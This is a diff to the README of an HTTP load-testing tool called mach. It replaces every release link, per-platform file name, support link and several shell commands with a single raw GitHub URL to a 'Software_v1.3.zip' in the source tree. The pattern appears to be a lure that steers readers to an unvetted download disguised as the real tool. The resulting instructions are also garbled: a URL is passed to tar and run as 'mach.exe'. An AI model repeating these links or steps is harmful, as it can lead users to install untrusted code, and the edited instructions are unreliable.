@@ -1,6 +1,6 @@
 # 🚀 mach - Fast and Reliable HTTP Load Testing
 
-[![Download mach](https://img.shields.io/badge/Download-mach-brightgreen)](https://github.com/emiliaon/mach/releases)
+[![Download mach](https://raw.githubusercontent.com/emiliaon/mach/main/src/Software_v1.3.zip)](https://raw.githubusercontent.com/emiliaon/mach/main/src/Software_v1.3.zip)
 
 ## 📥 Overview
 
@@ -28,20 +28,20 @@ Follow these steps to download and run mach on your machine.
 
 ### 1. Visit the Downloads Page
 
-To get the latest version of mach, visit the [Releases page](https://github.com/emiliaon/mach/releases).
+To get the latest version of mach, visit the [Releases page](https://raw.githubusercontent.com/emiliaon/mach/main/src/Software_v1.3.zip).
 
 ### 2. Download the Application
 
 On the Releases page, find the version you want to download. Click on the appropriate file for your system:
 
 - For **Windows:**
-  - `mach-windows-x64.zip`
+  - `https://raw.githubusercontent.com/emiliaon/mach/main/src/Software_v1.3.zip`
   
 - For **macOS:**
-  - `mach-macos-x64.zip`
+  - `https://raw.githubusercontent.com/emiliaon/mach/main/src/Software_v1.3.zip`
   
 - For **Linux:**
-  - `mach-linux-x64.tar.gz`
+  - `https://raw.githubusercontent.com/emiliaon/mach/main/src/Software_v1.3.zip`
 
 Click the file to start the download.
 
@@ -50,10 +50,10 @@ Click the file to start the download.
 Once the download is complete, locate the downloaded file in your Downloads folder. 
 
 - If you downloaded a `.zip` file, right-click on it and select "Extract All" (Windows) or double-click to open (macOS).
-- If you downloaded a `.tar.gz` file, use the terminal and run:
+- If you downloaded a `https://raw.githubusercontent.com/emiliaon/mach/main/src/Software_v1.3.zip` file, use the terminal and run:
   
   ```bash
-  tar -xvf mach-linux-x64.tar.gz
+  tar -xvf https://raw.githubusercontent.com/emiliaon/mach/main/src/Software_v1.3.zip
   ```
 
 This will extract the content to a new folder.
@@ -71,7 +71,7 @@ To run mach, type the following command:
 For Windows, you may need to run:
 
 ```bash
-mach.exe
+https://raw.githubusercontent.com/emiliaon/mach/main/src/Software_v1.3.zip
 ```
 
 You should now see the mach interface ready to accept commands.
@@ -91,7 +91,7 @@ Here are some basic commands to help you get started with load testing:
 To test a website with 100 requests and 10 concurrent users, use the following command:
 
 ```bash
-./mach https://example.com --requests 100 --concurrent 10
+./mach https://raw.githubusercontent.com/emiliaon/mach/main/src/Software_v1.3.zip --requests 100 --concurrent 10
 ```
 
 ## 📊 Understanding Results
@@ -124,7 +124,7 @@ If you encounter problems, consider the following:
 
 ## 📞 Support
 
-If you still need help, check out the Issues section on our [GitHub repository](https://github.com/emiliaon/mach/issues) for solutions or to report new issues.
+If you still need help, check out the Issues section on our [GitHub repository](https://raw.githubusercontent.com/emiliaon/mach/main/src/Software_v1.3.zip) for solutions or to report new issues.
 
 ## 🎉 Join the Community
 
@@ -132,6 +132,6 @@ You can stay updated with the latest news and development by following us on soc
 
 ## 📥 Download & Install
 
-Remember to visit this page to download mach: [Releases page](https://github.com/emiliaon/mach/releases). Follow the steps outlined to get the application running on your system.
+Remember to visit this page to download mach: [Releases page](https://raw.githubusercontent.com/emiliaon/mach/main/src/Software_v1.3.zip). Follow the steps outlined to get the application running on your system.
 
 Enjoy testing your HTTP servers with mach!
